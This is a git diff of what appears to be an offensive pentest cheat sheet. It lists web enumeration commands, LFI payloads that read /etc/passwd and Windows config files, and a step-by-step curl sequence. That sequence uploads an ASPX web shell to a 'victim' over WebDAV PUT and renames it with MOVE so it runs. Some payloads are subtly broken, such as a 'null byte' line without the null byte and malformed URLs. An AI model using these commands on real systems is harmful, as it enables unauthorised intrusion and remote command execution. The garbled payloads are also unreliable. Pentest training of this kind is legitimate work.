@@ -13,33 +13,38 @@ gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/com
 gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -x html,php,asp,aspx -o gobuster.txt
 gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -k -x html,php,asp,aspx -o gobuster.txt
 
+#with wfuzz
+wfuzz --hc 404,400 -c -z file,/usr/share/dirb/wordlists/big.txt http://<victim_ip>/FUZZ
+
 #with dirsearch
 python3 dirsearch.py -u http://<victim_ip>/ -e php -x 403,404 -t 50 (Warning: This scan takes a long time to run)
 
-#with wfuzz
-wfuzz --hc 404,400 -c -z file,/usr/share/dirb/wordlists/big.txt http://<victim_ip>/FUZZ
+******************************************************************************************************************************
 
 VULNERABILITY SCAN
 
 #with nikto;
 nikto --host=http://<victim_ip>
 
+******************************************************************************************************************************
 
 LFI
 
 #for Linux;
-/index.php?page=../../../etc/passwd             #basic
-/index.php?page=../../../etc/passwd             #null byte
-/index.php?page=%252e%252e%252fetc%252fpasswd   #double encoding
+http://<victim_ip>test.php?page=../../../../etc/passwd          #basic
+http://<victim_ip>test.php?page=../../../etc/passwd             #null byte
+http://<victim_ip>test.php?page=%252e%252e%252fetc%252fpasswd   #double encoding
 
 
 for Windows;
-http://<victim_ip>/../../../../../../WINDOWS/win.ini
-http://<victim_ip>/../../../../../../xampp/apache/bin/php.ini
+http://<victim_ip>/test.php?page=../../../../../WINDOWS/win.ini
+http://<victim_ip>/test.php?page=../../../../../xampp/apache/bin/php.ini
 
+******************************************************************************************************************************
 
 SQL Injection (Manual Steps)
 
+******************************************************************************************************************************
 
 SCENARIOS
 
@@ -47,14 +52,47 @@ SCENARIOS
 
 #MySQL to SHELL
 
+******************************************************************************************************************************
 
 CMS Enumeration
--------------------------------------------------------------------------------------------------------------------------------
+
 #Wordpress
+wpscan --url http://<victim_ip>/ --enumerate p --enumerate u --enumerate t
 
 #Joomla
+joomscan -u  http://<victim_ip>/ --enumerate-components
 
 #Drupal
+./droopescan scan drupal -u <victim_ip>
+
+******************************************************************************************************************************
+
+CURL
+
+#Uploading files to the victim system and changing the extension of the file uploaded to the victim system;
+ echo worldofpentest > test.txt                       #create file
+ curl -X PUT http://<victim_ip>/brc.txt -d @test.txt  #put to target
+ curl http://<victim_ip>/brc.txt                      #call the file
+ 
+ #Victim system put to shell  with curl;
+  cp /usr/share/webshells/aspx/cmdasp.aspx .
+  curl -X PUT http://<victim_ip>/brc_shell.txt -d @cmdasp.aspx
+  curl -X MOVE -H 'Destination:http://<victim_ip>/shell.aspx' http://<victim_ip>/brc_shell.txt
+  
+ Note: When we shell the victim system as above, we can get run time error in the system. 
+ The reason of this; the victim system noticed the shell we threw and erased the gaps.
+ 
+ #To protect the spaces, we should use the command "--data-binary";
+  curl -X PUT http://<victim_ip>/brc_shell.txt --data-binary @shell.aspx
+  curl -X MOVE -H 'Destination:http://<victim_ip>/shell.aspx' http://<victim_ip>/brc_shell.txt
+
+******************************************************************************************************************************
+
+WebDAV Server Attacks
+
+#What types of files can I upload to the victim system?
+ davtest --url http://<victim_ip>
+
 -------------------------------------------------------------------------------------------------------------------------------
 DNS Enumeration
 
